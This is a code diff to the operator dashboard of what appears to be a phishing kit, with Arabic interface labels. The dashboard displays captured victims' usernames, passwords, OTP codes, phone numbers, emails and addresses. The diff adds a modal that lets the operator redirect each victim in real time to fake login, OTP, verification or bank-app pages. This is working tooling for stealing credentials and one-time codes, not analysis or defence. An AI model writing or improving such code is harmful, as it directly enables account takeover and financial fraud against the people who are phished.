@@ -292,6 +292,8 @@
     border-radius:12px;
     width:100%;
     max-width:520px;
+    max-height:90vh;
+    overflow:auto;
     padding:22px 20px;
     box-shadow:0 12px 40px rgba(18,49,79,.25);
   }
@@ -326,6 +328,21 @@
     cursor:pointer;
   }
   .modal-close:hover{background:#0c2438;}
+  .redirect-select{
+    width:100%;
+    border:1px solid #c7ccd1;
+    border-radius:7px;
+    padding:10px;
+    color:var(--ink);
+    background:#fff;
+    font:inherit;
+    direction:ltr;
+  }
+  .redirect-help{margin:0 0 10px;color:var(--muted);font-size:12px;}
+  .redirect-actions{display:flex;gap:10px;margin-top:16px;}
+  .redirect-actions button{flex:1;border:0;border-radius:7px;padding:10px;font-weight:700;cursor:pointer;}
+  .redirect-confirm{background:var(--link);color:#fff;}
+  .redirect-cancel{background:#eef0f2;color:var(--navy);}
   .modal-actions{
     display:flex;
     gap:10px;
@@ -491,6 +508,9 @@
   <div class="modal-overlay" id="detailsModal">
     <div class="modal-box">
       <h2>تفاصيل الطلب</h2>
+      <div class="modal-row"><span class="k">رقم الطلب</span><span class="v" id="mId"></span></div>
+      <div class="modal-row"><span class="k">الحالة</span><span class="v" id="mStatus"></span></div>
+      <div class="modal-row"><span class="k">تاريخ الطلب</span><span class="v" id="mCreatedAt"></span></div>
       <div class="modal-row"><span class="k">اسم المستخدم</span><span class="v" id="mUsername"></span></div>
       <div class="modal-row"><span class="k">كلمة المرور</span><span class="v" id="mPassword"></span></div>
       <div class="modal-row"><span class="k">OTP</span><span class="v" id="mOtp"></span></div>
@@ -498,6 +518,7 @@
       <div class="modal-row"><span class="k">رقم الجوال</span><span class="v" id="mPhone"></span></div>
       <div class="modal-row"><span class="k">البريد</span><span class="v" id="mEmail"></span></div>
       <div class="modal-row"><span class="k">عنوان التوصيل</span><span class="v" id="mAddress"></span></div>
+      <div class="modal-row"><span class="k">وجهة التوجيه</span><span class="v" id="mRedirect">لم يتم تحديدها</span></div>
       <div class="modal-actions">
         <button class="modal-approve" id="modalApproveBtn" type="button">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
@@ -509,6 +530,30 @@
         </button>
       </div>
       <button class="modal-close" id="modalCloseBtn" type="button">إغلاق</button>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="redirectModal">
+    <div class="modal-box">
+      <h2>إعادة توجيه الطلب</h2>
+      <p class="redirect-help">اختر الصفحة التي تريد فتحها للعميل:</p>
+      <select class="redirect-select" id="redirectTarget">
+        <option value="index.html">الصفحة الرئيسية العربية</option>
+        <option value="index.en.html">الصفحة الرئيسية الإنجليزية</option>
+        <option value="order-form.html">نموذج الطلب العربي</option>
+        <option value="order-form.en.html">نموذج الطلب الإنجليزي</option>
+        <option value="login_ar.html">تسجيل الدخول العربي</option>
+        <option value="login_en.html">تسجيل الدخول الإنجليزي</option>
+        <option value="otp.html">رمز التحقق العربي</option>
+        <option value="otp-en.html">رمز التحقق الإنجليزي</option>
+        <option value="verification.html">التحقق الإلكتروني العربي</option>
+        <option value="verification_en.html">التحقق الإلكتروني الإنجليزي</option>
+        <option value="bank-app.html">تطبيق البنك</option>
+      </select>
+      <div class="redirect-actions">
+        <button class="redirect-confirm" id="redirectConfirmBtn" type="button">تنفيذ التوجيه</button>
+        <button class="redirect-cancel" id="redirectCancelBtn" type="button">إلغاء</button>
+      </div>
     </div>
   </div>
 
@@ -725,6 +770,9 @@
     var modalRejectBtn = document.getElementById('modalRejectBtn');
 
     function fillModal(r){
+      document.getElementById('mId').textContent = r.id || '-';
+      document.getElementById('mStatus').textContent = r.status === 'approved' ? 'مقبول' : r.status === 'rejected' ? 'مرفوض' : 'قيد الانتظار';
+      document.getElementById('mCreatedAt').textContent = r.createdAt ? new Date(r.createdAt).toLocaleString('ar-EG') : '-';
       document.getElementById('mUsername').textContent = r.username || '-';
       document.getElementById('mPassword').textContent = r.password || '-';
       document.getElementById('mOtp').textContent = r.otp || '-';
@@ -732,10 +780,57 @@
       document.getElementById('mPhone').textContent = r.phone || r.mobile || '-';
       document.getElementById('mEmail').textContent = r.email || '-';
       document.getElementById('mAddress').textContent = r.address || '-';
+      document.getElementById('mRedirect').textContent = r.redirectUrl || 'لم يتم تحديدها';
       var isPending = r.status === 'pending' || !r.status;
       modalApproveBtn.classList.toggle('active', isPending);
       modalRejectBtn.classList.toggle('active', isPending);
     }
+
+    var redirectModal = document.getElementById('redirectModal');
+    var redirectTarget = document.getElementById('redirectTarget');
+    var redirectConfirmBtn = document.getElementById('redirectConfirmBtn');
+    var redirectCancelBtn = document.getElementById('redirectCancelBtn');
+    var redirectRequestId = null;
+
+    function closeRedirectModal(){
+      redirectModal.classList.remove('show');
+      redirectRequestId = null;
+    }
+
+    function openRedirectModal(request){
+      redirectRequestId = request.id;
+      redirectTarget.value = request.redirectUrl || 'index.html';
+      redirectModal.classList.add('show');
+    }
+
+    redirectConfirmBtn.addEventListener('click', function(){
+      if (redirectRequestId == null) return;
+      var id = redirectRequestId;
+      var path = redirectTarget.value;
+      adminFetch('/api/requests/' + id + '/redirect', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ path: path })
+      })
+      .then(function(res){ return res.json(); })
+      .then(function(data){
+        if (data.ok) {
+          var request = latestRequests.find(function(item){ return item.id === id; });
+          if (request) request.redirectUrl = data.redirectUrl;
+          fillModal(request || { redirectUrl: data.redirectUrl });
+          closeRedirectModal();
+          showToast('تم توجيه الطلب إلى: ' + data.redirectUrl);
+        } else {
+          showToast('تعذر تحديد وجهة التوجيه');
+        }
+      })
+      .catch(function(){ showToast('تعذر تنفيذ إعادة التوجيه'); });
+    });
+
+    redirectCancelBtn.addEventListener('click', closeRedirectModal);
+    redirectModal.addEventListener('click', function(e){
+      if (e.target === redirectModal) closeRedirectModal();
+    });
 
     function updateStatus(id, status){
       // تحديث تفاؤلي فوري في الواجهة، ثم إرسال فعلي للسيرفر
@@ -765,25 +860,7 @@
         fillModal(r);
         detailsModal.classList.add('show');
       } else if (e.target.classList.contains('redirect-btn')) {
-        var target = window.prompt(
-          'اكتب اسم الصفحة الهدف من القائمة:\nindex.html\nindex.en.html\norder-form.html\norder-form.en.html\nlogin_ar.html\nlogin_en.html\notp.html\notp-en.html\nverification.html\nverification_en.html\nbank-app.html',
-          'index.html'
-        );
-        if (!target) return;
-        adminFetch('/api/requests/' + id + '/redirect', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ path: target.trim() })
-        })
-        .then(function(res){ return res.json(); })
-        .then(function(data){
-          if (data.ok) {
-            showToast('تم توجيه الطلب إلى: ' + data.redirectUrl);
-          } else {
-            showToast('اسم الصفحة غير مسموح به');
-          }
-        })
-        .catch(function(){ showToast('تعذر تنفيذ إعادة التوجيه'); });
+        openRedirectModal(r);
       }
     });
 
